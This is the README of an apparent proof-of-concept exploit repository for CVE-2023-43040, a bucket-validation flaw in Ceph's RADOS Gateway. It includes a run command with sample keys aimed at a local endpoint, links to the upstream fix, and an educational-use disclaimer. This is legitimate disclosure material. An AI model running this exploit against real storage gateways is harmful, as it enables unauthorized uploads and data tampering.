# CVE-2023-43040

This repository contains a proof-of-concept exploit for the CVE-2023-43040 vulnerability found in RADOS Gateway (RADOSGW). This vulnerability allows attackers to upload objects to any bucket accessible by the specified access key, potentially leading to unauthorized data manipulation or exfiltration.

```shell
$ pip install -r requirements.txt
$ python CVE-2023-43040.py --access_key 699GVXAYVZ5A3ZRYSCI0 --secret_key UZAHHNF3WzASPKCnDdQ8rCvAKaBvLlkZI2V8n7We --endpoint http://127.0.0.1:8080
```

<img src="https://github.com/riza/CVE-2023-43040/blob/main/CVE-2023-43040.jpg?raw=true" />

## References

* [CVE-2023-43040](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-43040)
* [quincy: [CVE-2023-43040] rgw: Fix bucket validation against POST policies](https://github.com/ceph/ceph/pull/53757)

## Disclaimer
This repository is for educational purposes only. The information and code provided herein are meant to demonstrate the vulnerability and are not intended for malicious use. The author is not responsible for any misuse of the provided code. Use this information responsibly and only in environments where you have explicit permission to test and secure systems. Unauthorized use of this information or code may be illegal and unethical.

## Author
* [Rıza Sabuncu](https://twitter.com/rizasabuncu)
